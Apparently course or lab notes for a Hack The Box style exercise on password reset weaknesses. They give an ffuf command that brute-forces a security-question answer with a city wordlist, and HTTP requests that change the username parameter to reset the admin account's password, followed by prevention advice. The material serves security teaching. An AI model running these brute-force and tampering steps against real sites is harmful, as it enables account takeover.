https://github.com/datasets/world-cities/blob/master/data/world-cities.csv

```shell-session
$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

![[Pasted image 20241106124858.png]]

```shell-session
$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```

```shell-session
$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

### Manipulating the Password Reset Request

A vulnerability in the password reset flow can arise when attackers manipulate parameters, often hidden, to reset the password of a different account. This flaw allows attackers to bypass security questions and alter the credentials of accounts they do not own.

#### Example Password Reset Flow

Consider a password reset process in which users are prompted to enter their username and answer a security question.

1. **Submitting Username**: The first request sends the username:
    ```http
    POST /reset.php HTTP/1.1
    Host: pwreset.htb
    Content-Length: 18
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

    username=htb-stdnt
    ```

2. **Answering the Security Question**: Next, the user provides the answer to a security question, with the username included as a hidden parameter:
    ```http
    POST /security_question.php HTTP/1.1
    Host: pwreset.htb
    Content-Length: 43
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

    security_response=London&username=htb-stdnt
    ```

3. **Resetting the Password**: Finally, the user sets a new password, with the username parameter included again:
    ```http
    POST /reset_password.php HTTP/1.1
    Host: pwreset.htb
    Content-Length: 36
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

    password=P@$$w0rd&username=htb-stdnt
    ```

#### Exploiting the Vulnerability

If the application does not validate that the username remains consistent throughout the entire process, an attacker can alter the `username` parameter in the final reset request to change the password for any account:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

In this scenario, the attacker bypasses the security question verification for a different account (e.g., `admin`) by simply manipulating the username parameter during the password reset stage.

#### Prevention Measures

To secure password reset functionality:

- **Maintain Consistency in State**: Ensure that the username and other session data remain consistent throughout the process. The system should verify that each step matches the intended user.
- **Secure Session Management**: Link the password reset process to a secure, temporary session that expires once the process is completed, preventing any manipulation of critical parameters.
- **Comprehensive Testing**: Regularly review the password reset flow for security issues, as even small logic flaws can lead to severe vulnerabilities.

By rigorously enforcing consistency and protecting sensitive parameters, you can prevent unauthorized password resets and protect user accounts from unauthorized access.